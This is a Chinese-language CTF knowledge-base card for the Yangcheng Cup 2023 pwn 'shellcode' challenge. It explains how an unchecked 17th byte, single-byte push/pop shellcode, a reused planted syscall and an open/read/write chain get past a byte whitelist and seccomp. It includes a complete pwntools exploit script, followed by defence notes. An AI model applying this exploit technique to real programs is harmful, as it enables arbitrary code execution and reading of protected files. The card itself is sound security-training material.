---
id: ctf-pwn-shellcode-16byte-whitelist-17th-unchecked-pop-ret-syscall
title: 16 字节字符白名单 + 第 17 字节漏检：用 0x50–0x5F 单字节 push/pop 布局寄存器，ret 跳入预置 syscall 以 0x50f 长度 read 续写第三段，dup2+ORW 绕过 seccomp
type: scenario
domain: ctf
path: ctf/pwn
technique: shellcode-alphabet-16byte-17th-unchecked-pop-ret-syscall
tags:
- ctf
- pwn
- shellcode
- byte-whitelist
- push-pop
- stack-pivot
- syscall
- seccomp
- orw
- dup2
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V685
  verified_at: '2026-11-13T14:40:33+08:00'
  notes: 已对照原文全文与22张截图核对（本卡对应 img/07-12、14-22）：checksec 显示 NX disabled/PIE/RWX；sub_13A2 中 memset(s,0,0x10) 后逐字节 read、(buf-s)>>4>0 才 break 实读 17 字节、while(*v4>=79 && *v4<=95) 仅覆盖前 16 字节（原文正文写 0x79-0x95 为笔误，图与代码为十进制 79-95 即 0x4F-0x5F，卡按图/码采用 0x4F-0x5F 正确）；seccomp_rule_add 放行 syscall 2/0/1/33（open/read/write/dup2）、seccomp_init(0) 默认 KILL；sc0 的 16 条 push/pop 全在 0x50-0x5F、第17字节 0xC3 ret，图15/16 的寄存器与栈布局（0x50f 槽位、ret 进预置 syscall）与原文一致；sc1 open/dup2(3,2)/read(2,rsp,0x30)/dup2(1,5)/write(5,rsp,0x30) 与图17-21一致；图22 输出 flag{assadasdasd}。未验证点：未本地复现，sc0 偏移依赖该二进制调用现场栈布局（原文注释 start+0x68）。dedup 最高候选 byte-whitelist-imul-add-xor-shmget-orw 为不同白名单与算术合成技术，非同链。
url: /docs/ctf/pwn/ctf-pwn-shellcode-16byte-whitelist-17th-unchecked-pop-ret-syscall/
draft: false
kb_aliases:
- 羊城杯2023 shellcode
- 0x4F-0x5F shellcode
- P0P code
- push/pop 单字节 shellcode
- 第 17 字节漏检
- 0x50f read 长度
- 预置 syscall 复用
---

## 一句话结论

当题目把 shellcode 读进 16 字节数组、逐字节要求落在 `0x4F–0x5F`（字符 `O`–`_`）、却因循环条件多读了第 17 字节且只校验前 16 字节时，可用 0x50–0x5F 这批“单字节 push/pop”指令在 16 字节内完成寄存器布局，把漏检的第 17 字节放成 `ret`（0xC3）；同时把先前 2 字节输入位置的 `0x0f 0x05`（syscall）既当作跳转目标、又把其中的 0x050f 当作 read 长度，`ret` 进 syscall 执行 `read(0, syscall_addr, 0x50f)` 续写不受限的第三段，最后用 open/dup2/read/write 绕过只允许 open/read/write/dup2 的 seccomp 读出 flag。

## 原理

- **题面（羊城杯2023-shellcode）**：主函数先 `read(0, buf, 2)`，若输入等于 `"ye"` 就打印假 flag，否则进入 `no_choice(buf)`。`no_choice` 中有 16 字节数组 `s`，用 `for (buf = s; buf; ++buf) { read(0, buf, 1); if ((buf - s) >> 4 > 0) break; }` 逐字节读入——偏移 16 时 `(16 >> 4) = 1 > 0` 才 break，因此实际写入 17 字节，比数组多 1 字节。随后 `while (*v4 >= 79 && *v4 <= 95) { ++v2; ++v4; }` 扫描，要求 `(v4 - s) >> 4 != 0`，即前 16 个字节必须全部落在十进制 79–95（`0x4F–0x5F`，字符 `O P Q R S T U V W X Y Z [ \ ] ^ _`）；第 17 字节只在扫描到它时才会被检查，而“前 16 字节合法”已让 `>>4` 校验通过，所以第 17 字节实际上不受约束。最后 `seccomp()` 后 `s[0]()` 直接执行栈上输入（NX disabled）。
- **白名单恰好是 push/pop 指令集**：0x50–0x5F 是 x86-64 的单字节 `push/pop` 寄存器指令（0x50 push rax、0x51 push rcx、0x52 push rdx、0x53 push rbx、0x54 push rsp、0x55 push rbp、0x56 push rsi、0x57 push rdi；0x58–0x5F 为对应 pop）。16 字节白名单 = 16 条单字节指令，可完全用栈搬运/交换寄存器，不需要任何立即数——所需常数直接从调用现场栈上已有值里取。
- **第 17 字节留给 ret**：`ret` 的机器码 0xC3 不在白名单内，但正好放在漏检的第 17 字节，于是 17 字节程序 = 16 条 push/pop + 一条 ret。
- **预置 syscall 的双重利用**：主函数最先读的 2 字节不是 `"ye"` 时进入 `no_choice`，把 `\x0f\x05`（`syscall`）发给它，这段字节留在调用者栈上的缓冲区里。它同时是：
  1. 一段可执行代码：`ret` 的目标地址就是这 2 字节所在位置；
  2. 一个数据常数：`0x0f 0x05` 按小端读成 16 位是 `0x050f = 0x50f`，正好作为 `read` 的 count。
- **寄存器布局与续写**：17 字节 shellcode 用 push/pop 把 `rax`/`rdi` 清零、`rdx` 设为 0x50f、`rsi` 指向预置 syscall 地址（具体靠三次 `pop rsi`、`push rsi; pop rsp` 的栈迁移，从调用现场栈槽中取出这些值；原文注释记录了该二进制实测的偏移 `start+0x68` 等），最后 `ret` 到 `syscall`：即 `read(0, syscall_addr, 0x50f)`。`read` 把第三段不受字符集限制的 shellcode 写回调用者缓冲区；syscall 返回后 RIP = syscall 地址 + 2，所以第三段前面补 2 字节（原文发 `b'aa' + sc1`）正好对齐到第一条真实指令。
- **第三段绕过 seccomp**：本题 seccomp 用 `seccomp_init(0)`（默认 KILL），只对 syscall 2（open）、0（read）、1（write）、33（dup2）加 ALLOW 规则，`execve` 会被杀，因此必须 ORW。原文第三段为：`open("flag")` → `dup2(3,2)` → `read(2,rsp,0x30)` → `dup2(1,5)` → `write(5,rsp,0x30)` 输出 flag（对本题 seccomp 而言，open/read/write 本身已放行，dup2 只是原文的转发写法）。

## 触发条件

- 用户输入被直接当作代码执行（栈可执行/NX disabled），且首 17 字节可由攻击者分两轮写入（先 2 字节 answer，再 17 字节 P0P code）。
- 校验只覆盖前 16 字节、实际读取允许第 17 字节，且允许字符集包含 0x50–0x5F（本例为 0x4F–0x5F）。
- 调用现场栈上存在可被 push/pop 取到的可用值（返回地址、预置的 2 字节 syscall 及其 0x50f 数值）；偏移需按具体二进制实测。
- seccomp 至少允许 open/read/write（本例还允许 dup2），禁 execve 时用 ORW。
- 能分多轮发送：第 1 轮 2 字节 answer，第 2 轮 17 字节 sc0，第 3 轮 `aa` + 第三段。

## 利用步骤

1. 对 `[2] Input: (ye / no)` 发送 `asm('syscall')`（`\x0f\x05`），避开 `"ye"` 分支进入 `no_choice`，同时把 2 字节 syscall 留在栈上。
2. 在 `[5] ======== Input Your P0P Code ========` 后发送 17 字节 sc0（16 条 push/pop + `ret`）。
3. sc0 执行后触发 `read(0, syscall_addr, 0x50f)`；发送 `b'aa' + sc1`，其中 sc1 为 open/dup2/read/write ORW。
4. syscall 返回后从 `syscall_addr + 2` 继续执行第三段，输出 flag（原文结果为 `flag{assadasdasd}`）。

## PoC

```python
from pwn import *
context(os='linux', arch='amd64')

# 第 1 轮：2 字节 syscall，留作跳转目标与 0x50f 常数
p.recvuntil(b'[2] Input: (ye / no)\n')
p.send(asm('syscall'))

p.recvuntil(b'======\n')

# 第 2 轮：17 字节 = 16 条 push/pop（0x50-0x5F）+ ret（0xC3，第 17 字节漏检位）
sc0 = asm('''
push rbx
pop rax
pop rsi
pop rsi
pop rsi
push rax
pop rdi
pop rdx
push rsi
pop rsp
pop rdx
push rdx
push rsi
push rax
pop rax
push rsi
ret
''')
p.send(sc0)

# 第 3 轮：前 2 字节用于对齐 syscall 返回后的 RIP=addr+2
sc1 = asm('''
push 0x67616c66        # "flag"
mov rdi, rsp
xor esi, esi
push 0x2
pop rax                # SYS_open
syscall
mov rax, 0x21          # SYS_dup2
mov rdi, 0x3
mov rsi, 0x2
syscall
xor rax, rax           # SYS_read
mov rsi, rsp
push 0x2
pop rdi
mov rdx, 0x30
syscall
mov rax, 0x21          # SYS_dup2
mov rdi, 0x1
mov rsi, 0x5
syscall
mov rax, 0x1           # SYS_write
mov rsi, rsp
mov rdi, 0x5
syscall
''')
p.send(b'aa' + sc1)

p.interactive()
```

说明：sc0 的 push/pop 顺序依赖该题目二进制的栈布局（原文注释以 `start+0x68` 记录实测偏移），换题需重新按栈内容调整；`ret` 必须恰好位于第 17 字节。

## 变体与关联

- **校验修正后**：若题目把第 17 字节也纳入白名单，则无法直接放 `ret`；需要找白名单内可形成控制流的字节组合，或改从白名单内其它多字节指令的副作用跳转。
- **字符集不同**：若白名单是其它区段，先检查该区段是否包含 `0x50–0x5F`、`0x58–0x5F` 或其它单字节寄存器/栈指令（如 `xchg eax,reg` 的 0x90+ 区段）。
- **常数来源**：0x50f 来自预置 2 字节 syscall；若现场没有这样的值，可从栈上其它可控字节（如输入长度、canary 片段）构造。
- **第三段的实现**：本题 seccomp 允许 open/read/write/dup2，因此 `dup2` 只是转发写法；若 seccomp 对 fd 有参数过滤，才需要 dup2 把 flag fd 转到允许的 fd 上。
- 关联：`[[ctf-pwn-visible-char-ae64-rdx-base-openat-sendfile-orw]]`（可见字符 + AE64 编码）、`[[ctf-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw]]`（字节白名单算术合成 syscall）、`[[ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile]]`（落地偏移与 padding）、`[[ctf-pwn-call-eax-stack-shellcode-byte-inc1]]`（输入变形后执行）。

## 检测与防御

- 本题是 CTF 题面设计问题：读取长度必须与数组严格一致（读 16 字节就不要让第 17 字节落盘），校验要覆盖全部写入字节；执行前把输入页设为只读/不可执行（W^X），或在执行前完成所有输入读取。
- seccomp 白名单要按“完成危害所需的最小集合”收紧：只放行 openat/read/write 还不够时，应配合 fd 参数过滤或干脆不把用户输入当代码执行。
- 现实程序侧：任何“逐字节过滤 + 执行”都容易在边界（多读一字节、少校验一位）上被绕过；应避免执行用户可控内存，使用 NX/CFI/沙箱。
